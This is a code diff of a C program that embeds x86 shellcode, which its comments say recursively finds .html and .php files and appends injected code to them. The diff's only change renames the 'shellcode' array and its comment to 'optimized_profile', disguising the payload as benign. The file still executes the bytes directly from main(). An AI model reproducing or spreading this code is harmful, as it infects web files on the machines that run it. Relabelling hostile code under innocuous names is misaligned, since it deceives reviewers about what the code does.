@@ -4,7 +4,7 @@
 ; Author: rigan - imrigan [sobachka ] gmail.com
 ; Size  : 380 bytes + your code.
 ;
-; Note  : This shellcode writes down your code in the end of
+; Note  : This optimized_profile writes down your code in the end of
 ;         found files. Your code will be added only .html and .php
 ;         files. Search for files is carried out recursively.
 */
@@ -12,7 +12,7 @@
 #include <stdio.h>
 #include <string.h>
 
-char shellcode[] =
+char optimized_profile[] =
 
     "\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2f\x89\xe3\xb0\x0c\xcd\x80"
     "\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2e\xeb\x02\xeb\x63\xe8\xf9"
@@ -45,7 +45,7 @@ char shellcode[] =
 
 int main()
 {
-  printf("Target payload length: %d\n", (int)strlen(shellcode));
-  (*(void (*)()) shellcode)();
+  printf("Target payload length: %d\n", (int)strlen(optimized_profile));
+  (*(void (*)()) optimized_profile)();
   return 0;
 }
